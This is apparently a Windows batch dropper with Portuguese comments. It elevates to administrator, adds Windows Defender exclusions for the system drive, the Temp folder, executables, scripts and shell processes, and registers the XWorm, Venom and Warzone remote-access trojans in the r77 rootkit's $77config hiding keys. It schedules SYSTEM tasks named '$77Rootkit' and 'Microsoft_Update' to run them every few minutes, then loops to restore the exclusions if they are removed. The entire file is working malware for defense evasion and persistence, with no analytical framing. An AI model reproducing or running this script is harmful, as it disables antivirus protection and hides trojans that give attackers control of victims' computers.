
@shift /0
@shift /0
@echo off

::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

:: Verifica se o script está sendo executado como administrador
net session >nul 2>&1
if %errorLevel% == 0 (
    goto :start
) else (
    powershell.exe -Command "Start-Process '%0' -Verb RunAs" & exit
)

:start

:: Adiciona à lista de exclusão
powershell.exe -command "Add-MpPreference -ExclusionPath '%Systemdrive%' -Force"
powershell.exe -command "Add-MpPreference -ExclusionPath '%SystemRoot%\Temp' -Force"
powershell.exe -command "Add-MpPreference -ExclusionExtension '.bat' -Force"
powershell.exe -command "Add-MpPreference -ExclusionExtension '.exe' -Force"
powershell.exe -command "Add-MpPreference -ExclusionExtension '.rar' -Force"
powershell.exe -command "Add-MpPreference -ExclusionProcess 'powershell.exe' -Force"
powershell.exe -command "Add-MpPreference -ExclusionProcess 'cmd.exe' -Force"
powershell.exe -command "Add-MpPreference -ExclusionProcess 'wscript.exe' -Force"


:: Adiciona os programas na lista de exceções do registro
set chave=HKEY_LOCAL_MACHINE\SOFTWARE\$77config\paths

reg add "%chave%" /v "chave 1" /t REG_SZ /d "%SystemRoot%\Temp\install.exe" /f
reg add "%chave%" /v "chave 2" /t REG_SZ /d "%SystemRoot%\Temp\GoogleUpdate.exe" /f
reg add "%chave%" /v "chave 3" /t REG_SZ /d "%SystemRoot%\Temp\XWorm.exe" /f
reg add "%chave%" /v "chave 4" /t REG_SZ /d "%SystemRoot%\Temp\Venom.exe" /f
reg add "%chave%" /v "chave 5" /t REG_SZ /d "%SystemRoot%\Temp\Warzone.exe" /f
reg add "%chave%" /v "chave 6" /t REG_SZ /d "%SystemRoot%\Temp\Update.exe" /f
reg add "%chave%" /v "chave 7" /t REG_SZ /d "%SystemRoot%\Temp\script.bat" /f

:: Adiciona os processos na lista de exceções do registro
set chave=HKEY_LOCAL_MACHINE\SOFTWARE\$77config\process_names

reg add "%chave%" /v "chave 1" /t REG_SZ /d "GoogleUpdate.exe" /f
reg add "%chave%" /v "chave 2" /t REG_SZ /d "XWorm.exe" /f
reg add "%chave%" /v "chave 3" /t REG_SZ /d "Venom.exe" /f
reg add "%chave%" /v "chave 4" /t REG_SZ /d "Warzone.exe" /f
reg add "%chave%" /v "chave 5" /t REG_SZ /d "cmd.exe" /f
reg add "%chave%" /v "chave 6" /t REG_SZ /d "conhost.exe" /f
reg add "%chave%" /v "chave 8" /t REG_SZ /d "powershell.exe" /f
reg add "%chave%" /v "chave 7" /t REG_SZ /d "Update.exe" /f

:: Adicionar Tarefa agendada para exeultar todos os programas

schtasks /create /tn "$77Rootkit" /tr "\"%SystemRoot%\Temp\install.exe\"" /sc minute /mo 30 /ru "SYSTEM" /rl HIGHEST /f /np
schtasks /run /tn "$77Rootkit"

schtasks /create /tn "Microsoft_Update" /tr "\"%SystemRoot%\Temp\script.bat\"" /sc minute /mo 1 /ru "SYSTEM" /rl HIGHEST /f /np
schtasks /run /tn "Microsoft_Update"

:loop
:: Verifica as extensões
set "excludeExtensions=.bat .exe .rar"
:loop
echo Verificando extensões...
for %%i in (%excludeExtensions%) do (
  powershell.exe -Command "Get-MpPreference | Select-Object -ExpandProperty ExclusionExtension" | findstr /i /c:"%%i" >nul
  if errorlevel 1 (
    echo %%i não está na lista de exclusão. Adicionando...
    powershell.exe -Command "Add-MpPreference -ExclusionExtension '%%i' -Force"
  )
)



:: Verifica os processos
set "excludeProcesses=powershell.exe cmd.exe wscript.exe"
:loop
echo Verificando processos...
for %%i in (%excludeProcesses%) do (
  powershell.exe -Command "Get-MpPreference | Select-Object -ExpandProperty ExclusionProcess" | findstr /i /c:"%%i" >nul
  if errorlevel 1 (
    echo %%i não está na lista de exclusão. Adicionando...
    powershell.exe -Command "Add-MpPreference -ExclusionProcess '%%i' -Force"
  )
)

:: Verifica as pastas
set "excludeFolders=%SystemRoot%\Temp %SystemDrive%"
:loop
echo Verificando pastas...
for %%i in (%excludeFolders%) do (
  powershell.exe -Command "Get-MpPreference | Select-Object -ExpandProperty ExclusionPath" | findstr /i /c:"%%i" >nul
  if errorlevel 1 (
    echo %%i não está na lista de exclusão. Adicionando...
    powershell.exe -Command "Add-MpPreference -ExclusionPath '%%i' -Force"
  )
)


goto  loop


